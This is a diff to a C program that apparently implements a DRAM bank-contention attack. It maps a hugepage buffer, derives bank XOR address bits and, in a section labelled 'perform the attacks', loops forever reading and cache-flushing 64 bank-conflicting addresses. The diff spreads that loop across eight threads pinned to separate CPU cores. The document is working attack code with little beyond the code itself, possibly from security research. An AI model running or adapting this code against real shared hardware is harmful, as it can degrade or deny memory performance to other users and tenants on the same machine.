@@ -1,3 +1,7 @@
+#ifndef _GNU_SOURCE
+#define _GNU_SOURCE
+#endif
+
 #include <stdlib.h>
 #include <stdio.h>
 #include <unistd.h>
@@ -7,14 +11,41 @@
 #include <sys/time.h>
 #include <sys/mman.h>
 #include <sys/resource.h>
-
+#include <pthread.h>
+#include <sched.h>
+#include <sys/types.h>
+#include <sys/syscall.h>
 
 #define ROUND_NR 1000000
+
+uint8_t *mem_chunk;
+int bank_index[6];
+int access_index[64];
 
 void cache_flush(uint8_t *address) {
         __asm__ volatile("clflush (%0)": :"r"(address) :"memory");
         return;
 }
+
+void *mem_hit(void *index_ptr) {
+	volatile uint8_t next = 0;;
+	int *index = (int *)index_ptr;
+        cpu_set_t set;
+        CPU_ZERO(&set);
+        CPU_SET(*index, &set);
+        if (sched_setaffinity(syscall(SYS_gettid), sizeof(cpu_set_t), &set)) {
+                fprintf(stderr, "Error set affinity\n")  ;
+                return NULL;
+        }
+	int i;
+	while (1) {
+		for (i=(*index)*8; i<(*index+1)*8; i++) {
+				next += mem_chunk[access_index[i]];
+				cache_flush(&mem_chunk[access_index[i]]);
+		}
+	}
+}
+
 
 uint64_t rdtsc(void) {
         uint64_t a, d;
@@ -23,7 +54,6 @@ uint64_t rdtsc(void) {
 }
 
 int main(int argc, char* argv[]) {
-	uint8_t *mem_chunk = NULL;
 	uint64_t mem_size = 1024*1024*1024;
 	int fd = open("/mnt/hugepages/nebula1", O_CREAT|O_RDWR, 0755);
 	
@@ -43,7 +73,6 @@ int main(int argc, char* argv[]) {
 		mem_chunk[i] = 1;
 
 	int bit, offset;
-	volatile uint8_t next = 0;;
 	uint64_t start, end;
 
 
@@ -83,7 +112,6 @@ int main(int argc, char* argv[]) {
 */
 
 /**********************Setp3: identify the XOR relation*****************************/
-	int bank_index[6];
 
 	bank_index[0] = 6;
 	bank_index[1] = 7;
@@ -110,7 +138,6 @@ int main(int argc, char* argv[]) {
 */
 
 /**********************Setp3: perform the attacks*****************************/
-	int access_index[64];
 
 	for (i=0; i<64; i++) {
 		access_index[i] = (((i>>5)&0x1)<<bank_index[5])/sizeof(uint8_t) +
@@ -121,12 +148,39 @@ int main(int argc, char* argv[]) {
 				  (((i>>0)&0x1)<<bank_index[0])/sizeof(uint8_t);
 	}
 
-	while (1) {
-		for (j=0; j<64; j++) {
-				next += mem_chunk[access_index[j]];
-				cache_flush(&mem_chunk[access_index[j]]);
-		}
-	}
+	int cpu_id_0 = 0;
+	int cpu_id_1 = 1;
+	int cpu_id_2 = 2;
+	int cpu_id_3 = 3;
+	int cpu_id_4 = 4;
+	int cpu_id_5 = 5;
+	int cpu_id_6 = 6;
+	int cpu_id_7 = 7;
+	pthread_t mem_thread_0;
+	pthread_t mem_thread_1;
+	pthread_t mem_thread_2;
+	pthread_t mem_thread_3;
+	pthread_t mem_thread_4;
+	pthread_t mem_thread_5;
+	pthread_t mem_thread_6;
+	pthread_t mem_thread_7;
+
+	pthread_create(&mem_thread_0, NULL, mem_hit, &cpu_id_0);
+	pthread_create(&mem_thread_1, NULL, mem_hit, &cpu_id_1);
+	pthread_create(&mem_thread_2, NULL, mem_hit, &cpu_id_2);
+	pthread_create(&mem_thread_3, NULL, mem_hit, &cpu_id_3);
+	pthread_create(&mem_thread_4, NULL, mem_hit, &cpu_id_4);
+	pthread_create(&mem_thread_5, NULL, mem_hit, &cpu_id_5);
+	pthread_create(&mem_thread_6, NULL, mem_hit, &cpu_id_6);
+	pthread_create(&mem_thread_7, NULL, mem_hit, &cpu_id_7);
+	pthread_join(mem_thread_0, NULL);
+	pthread_join(mem_thread_1, NULL);
+	pthread_join(mem_thread_2, NULL);
+	pthread_join(mem_thread_3, NULL);
+	pthread_join(mem_thread_4, NULL);
+	pthread_join(mem_thread_5, NULL);
+	pthread_join(mem_thread_6, NULL);
+	pthread_join(mem_thread_7, NULL);
 
 	return 0;
 }
